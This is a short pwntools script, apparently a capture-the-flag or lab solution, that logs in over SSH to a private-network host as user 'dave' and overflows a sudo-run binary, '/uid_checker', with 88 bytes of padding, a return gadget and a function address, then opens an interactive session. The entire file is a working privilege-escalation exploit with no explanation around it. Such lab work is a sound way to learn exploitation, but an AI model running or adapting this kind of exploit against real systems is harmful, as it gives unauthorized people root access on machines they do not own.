from pwn import *

conn = ssh(host="10.10.104.72", user="dave", keyfile="id_rsa")

offset = b'A'*88
ret = p64(0x004006c5)
func = p64(0x00000000004006a7)

exe = conn.process(['sudo','/uid_checker'])


payload = offset + ret + func


exe.sendline(payload)

exe.interactive()
